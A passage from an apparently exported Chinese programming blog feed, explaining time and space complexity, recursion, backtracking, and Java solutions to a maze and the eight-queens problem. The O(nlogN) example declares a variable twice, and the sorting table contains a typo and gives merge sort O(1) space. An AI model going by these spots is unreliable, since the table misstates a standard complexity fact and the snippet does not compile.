j;</span><br></pre></td></tr></table></figure><p>说明：上述代码在执行的时候，它消耗的时间并不随着某个变量的增长而增长，那么无论这类代码有多长，即使有几万几十万行，都可以用O(1)来表示它的时间复杂度。</p><h2 id="对数阶O-log2n"><a href="#对数阶O-log2n" class="headerlink" title="对数阶O(log2n)"></a>对数阶O(log<sub>2</sub>n)</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">1</span>;</span><br><span class="line"><span class="keyword">while</span>(i&lt;n)&#123;</span><br><span class="line">    i = i * <span class="number">2</span> ;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>说明：在while循环里面，每次都将 i 乘以 2，乘完之后，i 距离 n 就越来越近了。假设循环x次之后，i 就大于 n 了，此时这个循环就退出了，也就是说 2 的 x 次方等于 n，那么 x &#x3D;log<sub>2</sub>n也就是说当循环 log2n 次以后，这个代码就结束了。因此这个代码的时间复杂度为：O(log<sub>2</sub>n)  。 O((log<sub>2</sub>n) 的这个2 时间上是根据代码变化的，i &#x3D; i * 3时 ，则是 O((log<sub>3</sub>n) 。</p><blockquote><p>如果N&#x3D;a<sup>x</sup>（a&gt;0，a≠1），即a的x次方等于N（a&gt;0，且a≠1），那么数x叫做以a为底N的对数（logarIthm），记作x&#x3D;log<sub>a</sub>N。其中，a叫做对数的底数，N叫做真数，x叫做以a为底N的对数。</p></blockquote><h2 id="线性阶O-n"><a href="#线性阶O-n" class="headerlink" title="线性阶O(n)"></a>线性阶O(n)</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span>(<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i&lt;=n; i++)&#123;</span><br><span class="line">j = i;</span><br><span class="line">j++;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>说明：这段代码，for循环里面的代码会执行n遍，因此它消耗的时间是随着n的变化而变化的，因此这类代码都可以用O(n)来表示它的时间复杂度</p><h2 id="线性对数阶O-nlogN"><a href="#线性对数阶O-nlogN" class="headerlink" title="线性对数阶O(nlogN)"></a>线性对数阶O(nlogN)</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span>(<span class="type">int</span> <span class="variable">m</span> <span class="operator">=</span> <span class="number">1</span>; m&lt;=n; m++)&#123;</span><br><span class="line">i = <span class="number">1</span>;</span><br><span class="line"><span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">1</span>;</span><br><span class="line"><span class="keyword">while</span>(i&lt;n)&#123;</span><br><span class="line">    i = i * <span class="number">2</span> ;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>说明：线性对数阶O(nlogN) 其实非常容易理解，将时间复杂度为O(logn)的代码循环N遍的话，那么它的时间复杂度就是 n * O(logN)，也就是了O(nlogN)</p><h2 id="平方阶O-n²"><a href="#平方阶O-n²" class="headerlink" title="平方阶O(n²)"></a>平方阶O(n²)</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span>(<span class="type">int</span> <span class="variable">x</span> <span class="operator">=</span> <span class="number">1</span>; x&lt;=n; x++)&#123;</span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">1</span>; i&lt;=n; i++)&#123;</span><br><span class="line">        j = i;</span><br><span class="line">        j++;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>说明：平方阶O(n²) 就更容易理解了，如果把 O(n) 的代码再嵌套循环一遍，它的时间复杂度就是 O(n²)，这段代码其实就是嵌套了2层n循环，它的时间复杂度就是 O(n x n)，即  O(n²)。 如果将其中一层循环的n改成m，那它的时间复杂度就变成了 O(m x n)</p><h1 id="平均时间复杂度和最坏时间复杂度"><a href="#平均时间复杂度和最坏时间复杂度" class="headerlink" title="平均时间复杂度和最坏时间复杂度"></a>平均时间复杂度和最坏时间复杂度</h1><ul><li>平均时间复杂度是指所有可能的输入实例均以等概率出现的情况下，该算法的运行时间。</li><li>最坏情况下的时间复杂度称最坏时间复杂度。一般讨论的时间复杂度均是最坏情况下的时间复杂度。 这样做的原因是：最坏情况下的时间复杂度是算法在任何输入实例上运行时间的界限，这就保证了算法的运行时间不会比最坏情况更长。</li><li>平均时间复杂度和最坏时间复杂度是否一致，和算法有关。</li></ul><table><thead><tr><th>排序算法</th><th>平均时间</th><th>最差时间</th><th>稳定性</th><th>空间复杂度</th><th>备注</th></tr></thead><tbody><tr><td>冒泡排序</td><td>O(n²)</td><td>O(n²)</td><td>稳定</td><td>O(1)</td><td>n较小时好</td></tr><tr><td>交换排序</td><td>On²)</td><td>O(n²)</td><td>不稳定</td><td>O(1)</td><td>n较小时好</td></tr><tr><td>选择排序</td><td>O(n²)</td><td>O(n²)</td><td>不稳定</td><td>O(1)</td><td>n较小时好</td></tr><tr><td>插入排序</td><td>O(n²)</td><td>O(n²)</td><td>稳定</td><td>O(1)</td><td>大部分已有序时好</td></tr><tr><td>基数排序</td><td>O(n<sup>k</sup>)</td><td>O(n<sup>k</sup>)</td><td>稳定</td><td>O(n)</td><td>二维数组（桶）、一维数组（桶中首元素的位置）</td></tr><tr><td>希尔排序</td><td>O(nlogn)</td><td>O(n<sup>s</sup>)(1&lt;s&lt;2)</td><td>不稳定</td><td>O(1)</td><td>s是所选分组</td></tr><tr><td>快速排序</td><td>O(nlogn)</td><td>O(n²)</td><td>不稳定</td><td>O(logn)</td><td>n较大时好</td></tr><tr><td>归并排序</td><td>O(nlogn)</td><td>O(nlogn)</td><td>稳定</td><td>O(1)</td><td>n较大时好</td></tr><tr><td>堆排序</td><td>O(nlogn)</td><td>O(nlogn)</td><td>不稳定</td><td>O(1)</td><td>n较大时好</td></tr></tbody></table><h1 id="算法的空间复杂度"><a href="#算法的空间复杂度" class="headerlink" title="算法的空间复杂度"></a>算法的空间复杂度</h1><ul><li>类似于时间复杂度的讨论，一个算法的空间复杂度(Space Complexity)定义为该算法所耗费的存储空间，它也是问题规模n的函数。</li><li>空间复杂度(Space Complexity)是对一个算法在运行过程中临时占用存储空间大小的量度。有的算法需要占用的临时工作单元数与解决问题的规模n有关，它随着n的增大而增大，当n较大时，将占用较多的存储单元，例如快速排序和归并排序算法就属于这种情况。</li><li>在做算法分析时，主要讨论的是时间复杂度。从用户使用体验上看，更看重的程序执行的速度。一些缓存产品(redis, memcache)和算法(基数排序)本质就是用空间换时间。</li></ul>]]></content>
      
      
      <categories>
          
          <category> Java </category>
          
          <category> 数据结构和算法 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 时间复杂度 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>递归</title>
      <link href="/posts/95da/"/>
      <url>/posts/95da/</url>
      
        <content type="html"><![CDATA[<h1 id="递归-Recursion"><a href="#递归-Recursion" class="headerlink" title="递归(Recursion)"></a>递归(Recursion)</h1><h2 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h2><p>​        简单的说， 递归就是方法自己调用自己,每次调用时传入不同的变量.递归有助于编程者解决复杂的问题,同时可以让代码变得简洁。</p><h2 id="递归小案例"><a href="#递归小案例" class="headerlink" title="递归小案例"></a>递归小案例</h2><p><strong>打印问题：</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">test</span><span class="params">(<span class="type">int</span> n)</span> &#123;</span><br><span class="line"><span class="keyword">if</span> (n &gt; <span class="number">2</span>) &#123;</span><br><span class="line">test(n - <span class="number">1</span>);</span><br><span class="line">&#125;</span><br><span class="line">System.out.println(<span class="string">&quot;n=&quot;</span> + n);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>阶乘问题：</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="type">int</span> <span class="title function_">factorial</span><span class="params">(<span class="type">int</span> n)</span> &#123;</span><br><span class="line"><span class="keyword">if</span> (n == <span class="number">1</span>) &#123;</span><br><span class="line"><span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line"><span class="keyword">return</span> factorial(n - <span class="number">1</span>) * n;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="递归应用场景"><a href="#递归应用场景" class="headerlink" title="递归应用场景"></a>递归应用场景</h2><blockquote><ol><li>各种数学问题如: 8皇后问题 , 汉诺塔, 阶乘问题, 迷宫问题, 球和篮子的问题(google编程大赛)</li><li>各种算法中也会使用到递归，比如快排，归并排序，二分查找，分治算法等</li><li>将用栈解决的问题使用递归代码比较简洁</li></ol></blockquote><h2 id="递归需要遵守的重要规则"><a href="#递归需要遵守的重要规则" class="headerlink" title="递归需要遵守的重要规则"></a>递归需要遵守的重要规则</h2><blockquote><ol><li>执行一个方法时，就创建一个新的受保护的独立空间(栈空间)</li><li>方法的局部变量是独立的，不会相互影响</li><li>如果方法中使用的是引用类型变量(比如数组)，就会共享该引用类型的数据</li><li>递归<strong>必须向退出递归的条件逼近</strong>，否则就是无限递归,出现StackOverflowError异常</li><li>当一个方法执行完毕，或者遇到return，就会返回，遵守谁调用，就将结果返回给谁，同时当方法执行完毕或者返回时，该方法也就执行完毕。</li></ol></blockquote><h1 id="回溯-Backtrack"><a href="#回溯-Backtrack" class="headerlink" title="回溯(Backtrack)"></a>回溯(Backtrack)</h1><h2 id="介绍-1"><a href="#介绍-1" class="headerlink" title="介绍"></a>介绍</h2><p>​        回溯法是一种选优搜索法，按选优条件向前搜索，以达到目标。但当探索到某一步时，<strong>发现原先选择并不优或达不到目标，就退回一步重新选择</strong>，这种走不通就退回再走的技术为回溯法。</p><h2 id="回溯和递归的区别"><a href="#回溯和递归的区别" class="headerlink" title="回溯和递归的区别"></a>回溯和递归的区别</h2><p><strong>递归是一种算法结构</strong>。递归会出现在子程序中，形式上表现为直接或间接的自己调用自己。</p><p><strong>回溯是一种算法思想</strong>。它是用递归实现的。回溯的过程类似于穷举法，但回溯有“剪枝”功能，即自我判断过程。例如有求和问题，给定有 7 个元素的组合 [1, 2, 3, 4, 5, 6, 7]，求加和为 7 的子集。累加计算中，选择 1+2+3+4 时，判断得到结果为 10 大于 7，那么后面的 5, 6, 7 就没有必要计算了。这种方法属于搜索过程中的优化，即“剪枝”功能。</p><blockquote><p>用一个比较通俗的说法来解释递归和回溯：<br>我们在路上走着，前面是一个多岔路口，因为我们并不知道应该走哪条路，所以我们需要尝试。<strong>尝试的过程就是一个函数。</strong><br>我们选择了一个方向，后来发现又有一个多岔路口，这时候又需要进行一次选择。所以<strong>我们需要在上一次尝试结果的基础上，再做一次尝试</strong>，即<strong>在函数内部再调用一次函数</strong>，这就是<strong>递归</strong>的过程。<br>这样重复了若干次之后，发现<strong>这次选择的这条路走不通，这时候我们知道我们上一个路口选错了，所以我们要回到上一个路口重新选择其他路</strong>，这就是<strong>回溯</strong>的思想。</p></blockquote><h1 id="迷宫问题"><a href="#迷宫问题" class="headerlink" title="迷宫问题"></a>迷宫问题</h1><p><img src= "https://unpkg.com/nan-picture/img/load.gif" data-lazy-src="https://unpkg.com/nan-picture/blog/20200729111731.png"></p><h2 id="说明"><a href="#说明" class="headerlink" title="说明"></a>说明</h2><ol><li>小球得到的路径，和程序员设置的找路策略有关即：找路的上下左右的顺序相关</li><li>再得到小球路径时，可以先使用(下右上左)，再改成(上右下左)，看看路径是不是有变化</li></ol><h2 id="代码实现"><a href="#代码实现" class="headerlink" title="代码实现"></a>代码实现</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.nanzx.recursion;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">MiGong</span> &#123;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line"><span class="comment">// 利用二维数组模拟迷宫</span></span><br><span class="line"><span class="type">int</span>[][] map = <span class="keyword">new</span> <span class="title class_">int</span>[<span class="number">8</span>][<span class="number">7</span>];</span><br><span class="line"><span class="comment">// 使用1表示墙，将迷宫四周设置为墙</span></span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; <span class="number">7</span>; i++) &#123;</span><br><span class="line">map[<span class="number">0</span>][i] = <span class="number">1</span>;</span><br><span class="line">map[<span class="number">7</span>][i] = <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; <span class="number">8</span>; i++) &#123;</span><br><span class="line">map[i][<span class="number">0</span>] = <span class="number">1</span>;</span><br><span class="line">map[i][<span class="number">6</span>] = <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 设置挡板</span></span><br><span class="line">map[<span class="number">3</span>][<span class="number">1</span>] = <span class="number">1</span>;</span><br><span class="line">map[<span class="number">3</span>][<span class="number">2</span>] = <span class="number">1</span>;</span><br><span class="line">System.out.println(<span class="string">&quot;原先地图的情况：&quot;</span>);</span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; <span class="number">8</span>; i++) &#123;</span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> <span class="variable">j</span> <span class="operator">=</span> <span class="number">0</span>; j &lt; <span class="number">7</span>; j++) &#123;</span><br><span class="line">System.out.print(map[i][j] + <span class="string">&quot;  &quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line">System.out.println(<span class="string">&quot;&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//setWay(map, 1, 1);</span></span><br><span class="line">setWay2(map, <span class="number">1</span>, <span class="number">1</span>);</span><br><span class="line">System.out.println(<span class="string">&quot;小球走过，并标识过的地图的情况：&quot;</span>);</span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; <span class="number">8</span>; i++) &#123;</span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> <span class="variable">j</span> <span class="operator">=</span> <span class="number">0</span>; j &lt; <span class="number">7</span>; j++) &#123;</span><br><span class="line">System.out.print(map[i][j] + <span class="string">&quot;  &quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line">System.out.println(<span class="string">&quot;&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 使用递归回溯来给小球找路</span></span><br><span class="line"><span class="comment">// 说明</span></span><br><span class="line"><span class="comment">// 1. map 表示地图</span></span><br><span class="line"><span class="comment">// 2. i,j 表示从地图的哪个位置开始出发 (1,1)</span></span><br><span class="line"><span class="comment">// 3. 如果小球能到 map[6][5] 位置，则说明通路找到.</span></span><br><span class="line"><span class="comment">// 4. 约定： 当map[i][j] 为 0 表示该点没有走过；为 1 表示墙 ； 2 表示走过，是通路 ； 3 表示该点已经走过，但是走不通</span></span><br><span class="line"><span class="comment">// 5. 在走迷宫时，需要确定一个策略(方法) 下-&gt;右-&gt;上-&gt;左 , 如果该点走不通，再回溯</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="type">boolean</span> <span class="title function_">setWay</span><span class="params">(<span class="type">int</span>[][] map, <span class="type">int</span> i, <span class="type">int</span> j)</span> &#123;</span><br><span class="line"><span class="keyword">if</span> (map[<span class="number">6</span>][<span class="number">5</span>] == <span class="number">2</span>) &#123; <span class="comment">// 通路已经找到ok</span></span><br><span class="line"><span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line"><span class="keyword">if</span> (map[i][j] == <span class="number">0</span>) &#123; <span class="comment">// 如果当前这个点还没有走过</span></span><br><span class="line"><span class="comment">// 按照策略 下-&gt;右-&gt;上-&gt;左 走</span></span><br><span class="line">map[i][j] = <span class="number">2</span>; <span class="comment">// 假定该点是可以走通.</span></span><br><span class="line"><span class="keyword">if</span> (setWay(map, i + <span class="number">1</span>, j)) &#123;<span class="comment">// 向下走</span></span><br><span class="line"><span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125; <span class="keyword">else</span> <span class="keyword">if</span> (setWay(map, i, j + <span class="number">1</span>)) &#123; <span class="comment">// 向右走</span></span><br><span class="line"><span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125; <span class="keyword">else</span> <span class="keyword">if</span> (setWay(map, i - <span class="number">1</span>, j)) &#123; <span class="comment">// 向上</span></span><br><span class="line"><span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125; <span class="keyword">else</span> <span class="keyword">if</span> (setWay(map, i, j - <span class="number">1</span>)) &#123; <span class="comment">// 向左走</span></span><br><span class="line"><span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line"><span class="comment">// 说明该点是走不通，是死路</span></span><br><span class="line">map[i][j] = <span class="number">3</span>;</span><br><span class="line"><span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123; <span class="comment">// 如果map[i][j] != 0 , 可能是 1， 2， 3</span></span><br><span class="line"><span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 修改找路的策略，改成 上-&gt;右-&gt;下-&gt;左</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="type">boolean</span> <span class="title function_">setWay2</span><span class="params">(<span class="type">int</span>[][] map, <span class="type">int</span> i, <span class="type">int</span> j)</span> &#123;</span><br><span class="line"><span class="keyword">if</span> (map[<span class="number">6</span>][<span class="number">5</span>] == <span class="number">2</span>) &#123; <span class="comment">// 通路已经找到ok</span></span><br><span class="line"><span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line"><span class="keyword">if</span> (map[i][j] == <span class="number">0</span>) &#123; <span class="comment">// 如果当前这个点还没有走过</span></span><br><span class="line"><span class="comment">// 按照策略 上-&gt;右-&gt;下-&gt;左</span></span><br><span class="line">map[i][j] = <span class="number">2</span>; <span class="comment">// 假定该点是可以走通.</span></span><br><span class="line"><span class="keyword">if</span> (setWay2(map, i - <span class="number">1</span>, j)) &#123;<span class="comment">// 向上走</span></span><br><span class="line"><span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125; <span class="keyword">else</span> <span class="keyword">if</span> (setWay2(map, i, j + <span class="number">1</span>)) &#123; <span class="comment">// 向右走</span></span><br><span class="line"><span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125; <span class="keyword">else</span> <span class="keyword">if</span> (setWay2(map, i + <span class="number">1</span>, j)) &#123; <span class="comment">// 向下</span></span><br><span class="line"><span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125; <span class="keyword">else</span> <span class="keyword">if</span> (setWay2(map, i, j - <span class="number">1</span>)) &#123; <span class="comment">// 向左走</span></span><br><span class="line"><span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line"><span class="comment">// 说明该点是走不通，是死路</span></span><br><span class="line">map[i][j] = <span class="number">3</span>;</span><br><span class="line"><span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123; <span class="comment">// 如果map[i][j] != 0 , 可能是 1， 2， 3</span></span><br><span class="line"><span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="运行结果"><a href="#运行结果" class="headerlink" title="运行结果"></a>运行结果</h2><p>下右上左：</p><p>1  1  1  1  1  1  1<br>1  2  0  0  0  0  1<br>1  2  2  2  0  0  1<br>1  1  1  2  0  0  1<br>1  0  0  2  0  0  1<br>1  0  0  2  0  0  1<br>1  0  0  2  2  2  1<br>1  1  1  1  1  1  1  </p><p>上右下左:</p><p>1  1  1  1  1  1  1<br>1  2  2  2  2  2  1<br>1  0  0  0  0  2  1<br>1  1  1  0  0  2  1<br>1  0  0  0  0  2  1<br>1  0  0  0  0  2  1<br>1  0  0  0  0  2  1<br>1  1  1  1  1  1  1  </p><h1 id="八皇后问题"><a href="#八皇后问题" class="headerlink" title="八皇后问题"></a>八皇后问题</h1><p><img src= "https://unpkg.com/nan-picture/img/load.gif" data-lazy-src="https://unpkg.com/nan-picture/blog/20200729114358.png"></p><h2 id="说明-1"><a href="#说明-1" class="headerlink" title="说明"></a>说明</h2><p>八皇后问题，是一个古老而著名的问题，是回溯算法的典型案例。该问题是国际西洋棋棋手马克斯·贝瑟尔于1848年提出：在8×8格的国际象棋上摆放八个皇后，使其不能互相攻击，即：任意两个皇后都不能处于同一行、同一列或同一斜线上，问有多少种摆法。</p><h2 id="思路分析"><a href="#思路分析" class="headerlink" title="思路分析"></a>思路分析</h2><blockquote><ol><li>第一个皇后先放第一行第一列</li><li>第二个皇后放在第二行第一列、然后判断是否OK， 如果不OK，继续放在第二列、第三列、依次把所有列都放完，找到一个合适</li><li>继续第三个皇后，还是第一列、第二列……直到第8个皇后也能放在一个不冲突的位置，就算是找到了一个正确解</li><li>当得到一个正确解时，栈回退到上一个栈时，就会开始回溯，即将第一个皇后，放到第一列的所有正确解，全部得到.</li><li>然后回头继续第一个皇后放第二列，后面继续循环执行 1,2,3,4的步骤</li></ol></blockquote><h2 id="代码实现-1"><a href="#代码实现-1" class="headerlink" title="代码实现"></a>代码实现</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.nanzx.recursion;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Queen8</span> &#123;</span><br><span class="line"><span class="comment">// 表示有多少个皇后</span></span><br><span class="line"><span class="type">int</span> <span class="variable">max</span> <span class="operator">=</span> <span class="number">8</span>;</span><br><span class="line"><span class="comment">// 保存皇后放置位置的结果，列的位置，比如 arr = &#123;0 , 4, 7, 5, 2, 6, 1, 3&#125;</span></span><br><span class="line"><span class="type">int</span>[] arr = <span class="keyword">new</span> <span class="title class_">int</span>[max];</span><br><span class="line"><span class="keyword">static</span> <span class="type">int</span> count;</span><br><span class="line"><span class="keyword">static</span> <span class="type">int</span> judgecount;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line"><span class="type">Queen8</span> <span class="variable">queen8</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Queen8</span>();</span><br><span class="line">queen8.check(<span class="number">0</span>);</span><br><span class="line">System.out.println(<span class="string">&quot;解法一共有&quot;</span> + count + <span class="string">&quot;种&quot;</span>);</span><br><span class="line">System.out.println(<span class="string">&quot;判断冲突一共有&quot;</span> + judgecount + <span class="string">&quot;次&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">check</span><span class="params">(<span class="type">int</span> n)</span> &#123;</span><br><span class="line"><span class="keyword">if</span> (n == max) &#123;</span><br><span class="line">print();</span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; max; i++) &#123;</span><br><span class="line">arr[n] = i;</span><br><span class="line"><span class="keyword">if</span> (judge(n)) &#123;</span><br><span class="line">check(<span class="number">1</span> + n);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 检测摆放的第n个皇后是否和前面皇后冲突</span></span><br><span class="line"><span class="keyword">public</span> <span class="type">boolean</span> <span class="title function_">judge</span><span class="params">(<span class="type">int</span> n)</span> &#123;</span><br><span class="line">judgecount++;</span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; n; i++) &#123;</span><br><span class="line"><span class="comment">// 当arr[i] == arr[n]时，表示两个皇后处于同一列；</span></span><br><span class="line"><span class="comment">// 当Math.abs(n-i) == Math.abs(arr[n]-arr[i])时，</span></span><br><span class="line"><span class="comment">// 表示两条直角边相等，斜率为1，等腰直角三角形，两个皇后处于对角线，</span></span><br><span class="line"><span class="keyword">if</span> (arr[i] == arr[n] || Math.abs(n - i) == Math.abs(arr[n] - arr[i])) &#123;</span><br><span class="line"><span class="keyword">return</span> <span class="literal">false</span>;<span class="comment">//表示冲突</span></span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> <span class="literal">true</span>;<span class="comment">//不冲突</span></span><br><span 